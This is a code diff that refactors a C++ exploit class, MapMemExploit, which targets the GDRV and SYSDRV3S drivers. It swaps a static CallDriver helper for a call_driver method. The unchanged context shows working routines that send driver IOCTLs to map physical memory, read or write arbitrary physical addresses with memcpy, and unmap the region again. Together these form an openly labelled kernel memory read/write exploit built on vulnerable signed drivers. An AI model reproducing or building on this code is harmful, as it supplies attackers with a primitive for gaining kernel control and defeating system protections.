@@ -63,14 +63,6 @@ typedef struct _MAPMEM_PHYSICAL_MEMORY_INFO {
 } MAPMEM_PHYSICAL_MEMORY_INFO;
 #pragma pack(pop)
 
-// Helper function
-static BOOL CallDriver(HANDLE hDevice, DWORD dwIoControlCode,
-                      LPVOID lpInBuffer, DWORD nInBufferSize,
-                      LPVOID lpOutBuffer, DWORD nOutBufferSize) {
-    DWORD dwBytesReturned = 0;
-    return DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize,
-                          lpOutBuffer, nOutBufferSize, &dwBytesReturned, nullptr);
-}
 
 // Base MAPMEM exploit class supporting both GDRV and SYSDRV3S IOCTLs
 class MapMemExploit : public core::DriverExploit,
@@ -108,7 +100,7 @@ public:
             request.BusAddress.QuadPart = offset;
             request.Length = mapSize;
 
-            if (!CallDriver(device_handle_, map_ioctl_,
+            if (!call_driver(device_handle_, map_ioctl_,
                           &request, sizeof(request), &pMapSection, sizeof(PVOID))) {
                 return std::unexpected("Failed to map physical memory");
             }
@@ -120,7 +112,7 @@ public:
             ULONG_PTR readOffset = physical_address - offset;
             memcpy(buffer.data(), (PBYTE)pMapSection + readOffset, size);
 
-            CallDriver(device_handle_, unmap_ioctl_,
+            call_driver(device_handle_, unmap_ioctl_,
                       &pMapSection, sizeof(PVOID), nullptr, 0);
 
             return buffer;
@@ -140,7 +132,7 @@ public:
             request.BusAddress.QuadPart = offset;
             request.Length = mapSize;
 
-            if (!CallDriver(device_handle_, map_ioctl_,
+            if (!call_driver(device_handle_, map_ioctl_,
                           &request, sizeof(request), &pMapSection, sizeof(PVOID))) {
                 return std::unexpected("Failed to map physical memory");
             }
@@ -152,7 +144,7 @@ public:
             ULONG_PTR writeOffset = physical_address - offset;
             memcpy((PBYTE)pMapSection + writeOffset, data, size);
 
-            CallDriver(device_handle_, unmap_ioctl_,
+            call_driver(device_handle_, unmap_ioctl_,
                       &pMapSection, sizeof(PVOID), nullptr, 0);
 
             return {};
